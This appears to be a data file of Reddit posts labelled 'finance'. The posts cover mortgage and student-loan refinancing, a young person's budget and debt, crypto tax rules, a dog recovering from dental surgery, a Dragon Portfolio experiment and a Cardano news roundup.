We are both 26. Credit scores in the 700's for me, 650-680 for her. Combined income of around $82k. No kids. No plans to have them. We pay $1150 in rent a month in FL. We want to buy a house somewhere in FL and stay there for quite some time. We are sure we want to be here for the next decade at least, and I'm tired of losing money to rent.

 I also want to refinance my private loans, as in total my private loans alone are around $780 a month with interest rates in 8.75-10.25% range. I know refinancing these should lower interest and monthly payment. I'm fine with leaving federal loans untouched and just refinance my private loans.

I spoke with a mortgage officer with my credit union who recommended I not pull credit for preapproval until August since our lease is up in December and we are attempting to line up the move into a new house (if successful in buying) and the end of our lease at our apartment.

Would trying to refinance my student loans now, only 2.5 years after a CH7 bankruptcy be a stupid idea because of the credit pull when thinking of the mortgage credit pull that is going to happen when we try to start the buying process in August? I've seen anecdotes about student loan refinancing not being possible AT ALL after a bankruptcy, which I don't find fair - I've spent years now trying to fix my mistakes. I don't want to waste a hard credit pull getting rejected for a student loan only to get less favorable rates when we apply for a mortgage in August, which I've seen is much more likely to get approved then a student loan refinance.",finance
personalfinance,2-year update on being kicked out from my parents' house at 18 years old,"I turned 20 years old recently and I'm currently about to be an upcoming junior in college. For those who don't know, I got kicked out of my parents' house at around my birthday as soon as I become of legal age in the US. I'm an immigrant, so even more of an obstacle on my hand. I don't hate my parents, but I don't want to be around (or talk to) my toxic father my whole life. I have been in contact for some months with my mother who is currently in an argument with my father about communication with me... her own child. I have been respectful and haven't bad-mouthed my father; I haven't even spoken a single word to him in about a year now. He forbid my younger siblings from communicating with me as well - which truly hurt me the most. 

Nonetheless, I have been doing well since I moved out in 2019 and I followed all of your helpful advice in moving out, keeping up good financial habits, finding a place to stay, not going into debt. However, being an ignorant teen and alone, I have made some dumb decisions about my finances for about 5 months now. I can say this: I've not been motivated with being good with saving/spending money at all recently. I wasted so (!!!) much money on takeout food, unnecessary things, etc.

I got a little too comfortable with living on my own at 18-19 years old, successfully being able to be independent. I even bought a used car from the money I received in an internship. 

This year in 2021, I have spent so much money on the college refund I been receiving and now I'm sort of in debt. I don't have the discipline as I had before - I made many careless mistakes. I don't know what to do since I have no guidance. Please help me get out of this rut!

Currently, my situation is:

\- $1,250 in credit card debt ( I know :(.. I have been paying minimum payments tho)

\- lost my car insurance and got my license plate revoked ($60 fee + reinstate for $50) 

\- can't pay the upcoming rent and utilties in May ($500)

I wasted ALL of my scholarship/refund money from my college. In December, I believe I was depressed not being able to see my siblings during the holidays. I used takeout food, tech gadgets, clothes, etc to cope with my loneliness and depression. I even quit my job (which was perfectly fine) after working only 3.5 months and now I believe I only have about $250 in my bank out from working. I don't even want to think about how much money exactly I wasted these 4-5 months (prob over $5k tho).  

I started my first day of work today doing something that aligns with my future and I'm absolutely loving it. However, I will only be working until late May since I'm leaving to go see my grandpa in Europe this June that was paid for by my grandpa. I got lucky since they allowed me to work for a month and all I have to do is find a replacement (which I have 2 or 3 right now) for when I'm gone. 

I will essentially only make about \~$1,600 from working that month full-time. Just so I can take full advantage of my federal grants (scholarship grants doesn't work in the summer sessions), I will be taking online summer courses to get a refund of \~$430 (or $1,300 if I take a specific amount of credit hours) that won't be dispersed until mid-May. I will also have about $880 from the security deposit of my apartment when I move out in late May. The dilemma: I have rent this May 1st ($500) when I only have about $250 in my account right now. What should I do about this? I don't get refund until May 11-16th and I can't afford the late renters fee (about 5 days).

I value all of your opinions since they truly helped me get acclimated to my first 2 years of living on my own, so how should I handle getting out of cc debt and pay this upcoming rent?",finance

personalfinance,Unique Montage refinancing situation,"Hey everyone I am in a pretty good situation with my mortgage right now and all things considered would be just fine keeping on with how things currently are going. However, I will be starting graduate school this next year and will be hoping to have a bit more cash on hand and have been considering a cash out refinancing of my mortgage. Let me get into it:

We bought a 3 bed 2 bath 1200 sq foot home in the second most populous municipality in our state for $208K last year in march with a 3% interest rate on a 30 year fixed. This home was a foreclosure and in rough shape to begin with (ie needing a new roof, furnace, and various exterior repairs). We bought the home with a 5% down + cost of repairs (which roughly was equal to 5%) which came out to about a total of 10% down payment on the home. The repairs to the home have been completed and as of now the home is in generally better shape. EXCEPT we have gutted 1 bedroom and 1 bathroom which are currently down to the studs we hope to finish the bedroom by the time I start school and the bathroom hopefully soon after. 

With all of that being said comps in my neighborhood are ludicrous. We have homes down the road from us with similar square footage and b/b counts that are selling for $300K - $350K + while realistically I wouldn't assume we can get that high of a number even just the potential of $25K would make a huge dent in stuff we are having trouble completing due to lack of cash on hand which is why I am considering this in the first place. 

Budget wise we are doing just fine but have some student loans and house projects it would be nice to really bite into with the funds right now. I'm curious if it is worth the headache of refinancing now or if I should bide my time and instead wait until we sell a few years down the road so it would be more money in total.",finance

CryptoCurrency,PSA: Taxes DO NOT Work the Same Way With Crypto as Stocks... and Your Accountant Might Be Losing You Money,"Edit: This applies to US taxpayers.

Many tax accountants are treating crypto the same way they would stocks. Unfortunately, this is wrong, and if you've ever sold a coin at a loss then quickly bought back in... it REALLY matters.

&amp;#x200B;

With securities, if you sell at a loss then rebuy within 30 days you have performed a ""Wash Sale"" and your tax obligation will be more than just any gain minus loss. This rule does not apply to crypto. With crypto, you can simply add your total gains and losses together.

&amp;#x200B;

From the IRS documentation:  ""For federal tax purposes, virtual currency is treated as property. General tax principles applicable to property transactions apply to transactions using virtual currency.""

vet,Dog has trouble eating a wk after dental extractions,"My 15 year old doxie got all of her teeth extracted last Thursday. We expected she wouldn't have an appetite the 1st few days but she is still not eating much. She also has really smelly farts, kinda sulfury/rotten egg smell. And she is pawing furiously at her mouth (we try to distract her with pets or hold her teeny little legs down when she does so she doesn't mess with her stiches).

We fed her baby food at first, and switched to wet dog food, and/or boiled chicken and rice (anything we could get her to eat basically). She did get a better appetite on Tuesday, but puked it all up. Same thing happened Wednesday. We thought we maybe fed her too much, so we've been going smaller portions of just chx/rice, but now she is just not interested. You have to beg her to eat. She had a small breakfast and dinner yesterday and kept it down, but wasn't interested in food today at all. She smells it and turns her face away or tries to bury it with her blanket. 

We hand feed her and she has a lot of trouble getting and keeping the food in her mouth because now her tongue only comes out one side of her mouth. That and the pawing at her face look so frustrating and I feel terrible. :(

We tried giving her a quarter tab of pepcid an hour before breakfast and it hasn't really seemed to make a difference. 

We did do a blood panel before. She had slightly elevated calcium, liver and kidney levels but the vet (dental specialist) said it wasn't concerning and that our dog was a typical patient for her in terms of age and health.

CryptoCurrency,On the Tax Implications of automatic LPs (e.g. SafeMoon tokenomics) and why it matters for holders,"**Summary**

I'm not a tax expert, but it's tax season and I've been thinking about taxes. It dawned upon me that the ""automatic LP"" tokenomics, for which Honeybee Finance and its various clones (Safemoon in particular) are now well known for, would likely be considered a taxable event under IRS guidance.

When these automatic LPs are owned by a US Person (or a taxable person in any other jurisdiction where similar tax rules apply, e.g., Canada), this means that a rather hefty tax bill is being incurred. Since the LPs are locked for many years, this tax bill cannot be paid. This spells bad news for the Person who owes the tax. And due to their importance to the token they are backing (e.g., either as the entity backing the person, or one of the devs), this could be potentially risky for holders as well.

I would be curious for everyone's thoughts on this.

&amp;#x200B;

**More thoughts I collected**

For concreteness I'll use Safemoon since it's the biggest, but I believe these thoughts would apply to any auto-LP contract that locks the LPs in a wallet (e.g., most Honeybee Finance clones). I think they would not apply to any auto-LP contract that burns the LPs, such as the contracts by Moontoken or Bonfire).

* The liquidity injection (5% of volume) goes to a wallet. Presumably this is owned/controlled by one or more of the Safemoon devs, but it doesn't actually matter...  we will just assume that this is a US ""Person"" (within the meaning of the US Tax Code, whether it is a person or an entity), and that Person must pay tax to the IRS on taxable events. \[1\]
* The receipt of cryptocurrency is generally taxable as ordinary income, and so the receipt of the Safemoon itself might be considered taxable by the IRS. \[2\]  Even if for some reason it is not, however, the exchange of Safemoon for BNB that occurs as part of the liquidity injection protocol exchanges one cryptocurrency (SafeMoon) for another (BNB), which is taxable (in this case as short term capital gains) under IRS guidance. \[3\]
* In the 48 hour period from 0:00 UTC April 20 to 0:00 UTC April 22, there were 12 Safemoon liquidity injections valued at approximately: 1.7M, 1.8M, 2.0M, 2.3M, 1.9M, 1.9M, 3.1M, 2.5M, 1.6M, 1.8M, 2.5M, 3.3M \[4\].  So that is a total of approximately 26.4 million USD. If these transactions were to be taxed as ordinary income by the Person who receives them, that would result in a federal tax bill of 37% \* 26.4 = \~$10M (for just this one 48 hour period!). \[5\]    
Similar transactions have occurred ever since the launch of SafeMoon, as part of its automated liquidity injection protocol. \[4, 6, 7\]
* Unfortunately, these LPs have been locked (or have been committed to be locked) for 4 years \[7, 8, 9\], and so it seems that whoever is incurring this tax bill is unable to pay it.

&amp;#x200B;

**What this means for the taxpayer**

I'm not actually sure, but I think that if the tax is indeed owed, the IRS will try to collect the tax to the best of its ability. There are some notes on the website here: [https://www.irs.gov/newsroom/what-if-i-cant-pay-my-taxes](https://www.irs.gov/newsroom/what-if-i-cant-pay-my-taxes). So my random thoughts are that:

1. the taxpayer might be able to borrow money to pay the tax until it the LP unlocks and then pull/sell the LP to pay back the debt,
2. the taxpayer might be able to use future liquidity injections to pay the tax (in violation of the token's auto-LP protocol),
3. the taxpayer might be able to renounce ownership of the LPs to incur either a tax loss or deduction,
4. the taxpayer might be able to negotiate a solution with the IRS.

Other options may also exist, but again, I'm not a tax expert.

&amp;#x200B;

**What this means for holders of auto-LP tokens (Safemoon et al.)**

This is potentially a significant risk for holders of tokens that don't burn or otherwise renounce ownership of the auto-LPs (e.g., Safemoon), since options 1-2 and 4 listed above are quite bad. In case 1, it basically ensures a future pull of the liquidity. In case 2 it violates the token's auto-LP protocol. Case 4 might involve the IRS claiming ownership of the LPs, which it could later pull when they unlock.

Case 3, however, could be quite favorable to holders of the token, since it would essentially lock the liquidity forever, as is done by a few of the more holder friendly auto-LP contracts (e.g., Bonfire / Moontoken).

investing,The 100 Year Portfolio: A Look at Using the Dragon Portfolio as a Retail Investor,"EDIT: I added the [MacroVoices podcast episode](https://www.youtube.com/watch?v=4jDIifbY71g) where Chris Cole goes over the Dragon Portfolio. I would highly recommend listening to it as context for this post if you are not going to read the paper. 

- - - - - - - -

Chris Cole released a paper last year called ""The Allegory of the Hawk and the Serpent."" The paper detailed how investors could protect and build their wealth over a 100 year period. If you haven't read the paper, I would highly recommend doing so [here](https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;ved=2ahUKEwi95qub1ZXwAhVTHM0KHU7QDQMQFjAAegQIAxAD&amp;url=https%3A%2F%2Fwww.macrovoices.com%2Fguest-content%2Flist-guest-publications%2F3502-the-allegory-of-the-hawk-and-serpent%2Ffile&amp;usg=AOvVaw1RpaeVw0O4wF4dO4MIpgs5). In it, he details how our idea of ideal portfolio construction has been warped by the last 40 years, namely an environment where interest rates have been falling. This has lead most investment advisors to recommend a stock/bond portfolio. This is also known as the 60/40 portfolio. 

The idea behind the 60/40 portfolio is that stocks and bonds are  anti-correlated, meaning when stocks go up, bonds go down and visa versa. This allows the investor to grow their wealth over time without major drawdowns. Avoiding major drawdowns is key in any portfolio construction. The issues arise when you start looking at periods beyond the early 80s. This was the time interest rates peaked, and they have been falling ever since. One of the question Chris Cole asks is ""how would this portfolio perform over 100 years?"" The answer is poorly. For two separate decades (the 30s and the 70s), this portfolio would have had significant drawdowns. Why? Because during these periods, stocks and bonds were positively correlated. Stocks and bonds moved up and down together. 

What is Chris Cole's solution? He calls it the Dragon Portfolio. A portfolio that has elements beyond those of stocks and bonds. He recommends the following allocation:

* 20% Gold
* 20% Long Equity
* 20% Low Risk Long Duration Bonds
* 20% Commodity Trend
* 20% Long Volatility

Not only does this portfolio perform well during periods like the 30s or 70s, but it also outperforms the traditional advice during the good decades. the portfolio also outperforms during good periods. Over the last 40 years, the Dragon Portfolio has an annualized rate of return of 10.1% while the 60/40 portfolio only returns 3.9% during the same period.

For the retail investor, the first three elements are easy enough for the average investor to achieve. Simply invest in GLD, TLT and the equity index of your choice. Commodity trend is doable as well. Use a simple trend following system allocated to a basket of commodities. You could do a 40-50 day cross over on a broad commodity etf like DJP or GNR. However, Long Volatility proves trickier. Most investors don't know how to go long volatility beyond buying the VXX etf. Unfortunately, the carry cost makes this untenable. Take a look at the VXX chart over a five year time horizon. This thing is consistently melting down. Here is where Chris Cole makes his pitch. He offers professionally managed Long Volatility funds that fit into the Dragon Portfolio. Only downside is you must be a ""Qualified Investor."" Yes, qualified, not accredited. IE your net worth needs to be over 5 million dollars to even have a conversation about his products. 

Needless to say, the average retail investor does not have this net worth or else he'd be lying on a beach after telling his boss to shove it. My goal is to test a simple long volatility strategy in combination with the other elements of the Dragon Portfolio to see if the average retail investor can invest using Chris Cole's methodology. To do this, I opened up a paper trading account with $100,000 and will be tracking this portfolio on a weekly basis. I broke down the allocations as follows:

* 20% GLD - Gold ETF
* 20% TLT - Long Duration US Government Bonds
* 20% RSP - Equal weight S&amp;P 500. This tends to outperform the S&amp;P 500 over time by about 1-2% per year
* 20% DJP - Long Bloomberg commodity index. Commodities are in an uptrend right now. I may change this to GNR.
* 1% IWM 90 day Long Straddle (rolling every 30 days) - Long Volatility representing long/short 100 shares of the Russell 2000. 

You might be wondering why I am doing the Russell 2000 straddle. Two reasons. First, the straddle is the definition long volatility. You are long a call and a put while betting the value of either leg will go further than the implied price represents. Chris Cole mentions in an interview on MacroVoices this is the broad outline for the long volatility component he uses. Second, the IWM is a small enough ETF that a $100,000 account can have 20% represented by a single put and call contract. We aren't trying to leverage this portion to the hilt. We are trying to keep the theta burn small enough that when a big risk on or risk off event happens, the straddle spikes up. The goal is to have anti-correlated assets classes.

[Here](https://imgur.com/gallery/25913Hp) are my current allocations. I'll be posting updates every week and comparing the performance to a 60/40 portfolio as well as a long equity portfolio (100/0) to see how they perform. 

I would appreciate any feedback or advice on the strategy.",finance

personalfinance,First Money Moves Out of College,"Hey y'all, I am getting ready to graduate from college next  month, and I would like some advice on finances. I am 20 years old, and I just accepted my first job out of school working in tech in Central Virginia making about $100k. My personal cost of living as well as the region is generally pretty low (currently living as a broke college student lol), so I kind of want to save and invest nearly everything. Does the following breakdown make sense?  


**Investments**

* Roth 401k: $19,500 + $5,100 (company match) = $24,600
* Roth IRA: $6,000
* HSA: $7,200 (I am on my parents' high-deductible plan but I am not their tax-dependent, so my understanding is that I can contribute the full family amount, but please correct me if I am wrong).
* Employee Share Purchase Program: $8,000 + $1,200 (company match) = $9,200
* Taxable Brokerage Account: $2,000
* Savings Account Emergency Fund: $5,000

Total Investments: $54,000

I am planning on putting most of this into SPY or a 2060 Target Date Fund.

&amp;#x200B;

**Taxes**

I estimate my total FICA + Federal + State taxes to be around $22,000, assuming I file single. This is my first time making a real income other than summer jobs and such, and this honestly seems like a lot. Should I consider making my 401k contributions pre-tax instead of Roth to reduce this? or should I assume I will make more money in the future and be paying more taxes so Roth is better for now?

&amp;#x200B;

**Estimated Expenses**

* Rent: $700/mo (I think I can find a 2 bed/1 bath for around $1,400 and split it with a roommate).
* Utilities: $100/mo
* Groceries: $200/mo (I cook most days.)
* Eating out: $200/mo (This is based off of going out for 4 $12 meals a week.)
* Transportation (auto loan + gas): $300/mo (I plan on buying a used Toyota for &lt;$10,000 and taking a loan for about $7,500 of it)
* Fun things (entertainment, concerts, clothing, gadgets, etc): $150/mo
* Misc: $250/mo

Total Monthly Budget: $1,900/mo --&gt; $22,800/yr


For context, I currently have monthly expenses of around $1200/mo which I cover with a part-time job I have and occasional help from my parents. My rent is a little cheaper at the moment and I don't really go out as much (thanks COVID), so that's why I think $1,900/mo makes sense.

&amp;#x200B;

&amp;#x200B;

It looks like these three categories is just shy of $100k. I have never really done this before, so please please let me know if any of this sounds unrealistic. Is there anything I am missing? Could I be more aggressive in saving/investing? Any and all advice would be greatly appreciated! Thanks, y'all!



Edit: I have $7,500 in student loans, but since those are on pause I am not trying to pay them now. Once interest starts back up in the fall, should I make more than the minimum payment of $100/mo (the loan is federal at 2.75%)?",finance

I'm looking at refinancing now. Not taking any cash out. Looking at 10/yr at 1.875%, paying $3,350 / month, or 15/yr at 2%, paying $2,600 / month.

Given the interest rates for 10/15 year are so close, is the 15 year a much better option (since I can invest the monthly savings)?   I've never refinanced before. Thanks.",finance

Let's go....

Newly covered today: 

1. We’ve had really good reporting from the community on World Mobile developments with Cardano. I just want to take a second to thank you guys. Reddit user [/u/ricklepicklemydickle](https://www.reddit.com/user/ricklepicklemydickle/) first alerted us to the World Mobile developments and then youtube user [Whiskey 1234](https://www.youtube.com/channel/UCyBeEq-paultoA127TYcDjQ) (love both usernames btw) let us know that he attended a conference where he encountered World Mobile and “asked them if they knew about Cardano blockchain and the reply was they were announcing partners at the end of this month.” Thank you very much for this intel guys. This is what Army of Spies is all about. Many thanks for your contributions, gentlemen. 
2. Alko Sumatra Kopi is going to export 100 tonnes of coffee from Sumatra to China and track it all farm to cup using Emurgo Trace! We reported previously on the engagement of Emurgo Trace here and now it’s being put into action. [https://emurgo.io/blog/emurgo-client-alko-is-the-first-enterprise-to-utilize-blockchain-for-coffee-traceability-in-southeast-asia](https://emurgo.io/blog/emurgo-client-alko-is-the-first-enterprise-to-utilize-blockchain-for-coffee-traceability-in-southeast-asia)
3. In Charles’s recent AMA, he mentioned that the Africa Special will be a Pan African event and they WILL talk about various deals they have in multiple countries. So, this tells us they do have multiple deals in multiple countries. That was a little unclear previously.  [https://www.youtube.com/watch?v=8mP0JSgf9CU](https://www.youtube.com/watch?v=8mP0JSgf9CU)

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
4. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)
5. We hit 100% decentralization of block production tomorrow. Breath it in, friends. Taste the sweet completely decentralized air. Many crypto ecosystems will never know that feeling. [https://twitter.com/InputOutputHK/status/1376527930159816706](https://twitter.com/InputOutputHK/status/1376527930159816706)
6. Today is D-Day, d=0, complete decentralization of block production as covered in preceding days. Enjoy it guys!!!
7. The Daedalus wallet now supports native tokens! [https://twitter.com/InputOutputHK/status/1376936748715020288](https://twitter.com/InputOutputHK/status/1376936748715020288)
8. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
9. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
10. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
11. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe. [https://www.youtube.com/watch?v=B8Yj\_dvh7OA](https://www.youtube.com/watch?v=B8Yj_dvh7OA) [https://www.youtube.com/watch?v=p-1TKq7okhs](https://www.youtube.com/watch?v=p-1TKq7okhs)
12. Cardano hits 400k delegators! [https://twitter.com/RichardMcCrackn/status/1377732956194766850](https://twitter.com/RichardMcCrackn/status/1377732956194766850)
13. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture. [https://www.yahoo.com/entertainment/graph-blockchain-announces-acquisition-cardano-110000210.html](https://www.yahoo.com/entertainment/graph-blockchain-announces-acquisition-cardano-110000210.html)

15. Occam.fi is creating a defi launchpad on Cardano that will be called OccamRazer. [Cointelegraph OccamRazer Article](https://cointelegraph.com/press-releases/occamrazer-the-first-defi-launchpad-for-cardano)
16. Orion Protocol is aiming to be the first liquidity aggregator on Cardano. [https://coinmarketcap.com/el/headlines/news/orion-protocol-and-cardano/](https://coinmarketcap.com/el/headlines/news/orion-protocol-and-cardano)
17. How hard is learning Haskell from scratch? Today’s youtube companion to this post describes my experience so far learning Haskell as a beginner with little programming experience. [https://haskellbook.com/ ](https://haskellbook.com/)[http://learnyouahaskell.com/chapters](http://learnyouahaskell.com/chapters) [Derek Banas Youtube Haskell Tutorial](https://www.youtube.com/watch?v=02_H3LjqMr8)
18. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal! This could finally retire rumor #1 that started the Rumor Rundown. [https://twitter.com/ArmySpies/status/1378416705282613253](https://twitter.com/ArmySpies/status/1378416705282613253)
19. Cardano NFTs get some coverage on CoinTelegraph. [https://cointelegraph.com/news/wild-west-as-developers-macgyver-highly-popular-nfts-on-cardano/amp](https://cointelegraph.com/news/wild-west-as-developers-macgyver-highly-popular-nfts-on-cardano/amp)
20. Emurgo Academy for blockchain education? Has anyone heard of this? [https://twitter.com/emurgo\_io/status/1378346801598754816](https://twitter.com/emurgo_io/status/1378346801598754816)

22. SpaceBudz published a great article on how they were able to distribute 10,000 NFTs. [https://spacebudz.medium.com/how-we-pulled-off-the-sale-9dbe54c30ba5](https://spacebudz.medium.com/how-we-pulled-off-the-sale-9dbe54c30ba5)
23. For those learning Haskell/Plutus, check out this awesome one hour video from 2012 with Brian Beckman that introduces monoids and monads in a very non-scary way. [https://www.youtube.com/watch?v=ZhuHCtR3xq8](https://www.youtube.com/watch?v=ZhuHCtR3xq8)
24. Sebastien was recently on Kaizen Crypto and detailed how Emurgo plans to deliver Proof of Keys for Cardano whereby users could sign a message to prove that they own the private keys to a certain account in a standardized format. All queued up to the exact spot: [https://youtu.be/VcRlL-6YROY?t=625](https://youtu.be/VcRlL-6YROY?t=625)

26. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors. [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
27. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
28. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
29. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
30. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
31. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
32. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
33. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
34. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
35. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
36. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
37. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
38. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
39. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
40. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
41. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)

47. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)
48. The Plutus Pioneer program has been open sourced! Lecture #1 has an extremely good explanation of why the EUTxO model in Cardano is so much more conducive to security and much greater predictability than the account balance model in Ethereum.

59. Occam.fi partners with Bitcoin.com as custodian to create an ETH-ADA bridge. According to the article, this will allow for any Cardano native token to seamlessly switch to an ERC-20 token and vice versa. The vice versa part is what the ERC-20 Converter does for us already right?

